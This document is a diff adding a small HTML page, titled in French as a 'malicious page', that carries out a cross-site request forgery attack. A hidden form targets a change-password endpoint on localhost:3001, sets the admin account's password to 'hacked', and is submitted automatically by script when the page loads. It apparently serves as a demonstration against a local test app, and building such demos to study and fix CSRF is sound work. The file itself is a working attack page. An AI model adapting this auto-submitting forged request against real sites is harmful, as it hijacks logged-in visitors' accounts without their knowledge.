@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Page Malveillante</title>
+</head>
+<body>
+    <h1>Ceci est une page malveillante</h1>
+    <form action="http://localhost:3001/change-password" method="post" id="csrf-form">
+        <input type="hidden" name="username" value="admin" />
+        <input type="hidden" name="newPassword" value="hacked" />
+        <button type="submit">Change Admin Password</button>
+    </form>
+    <script>
+        document.getElementById('csrf-form').submit();
+    </script>
+</body>
+</html>
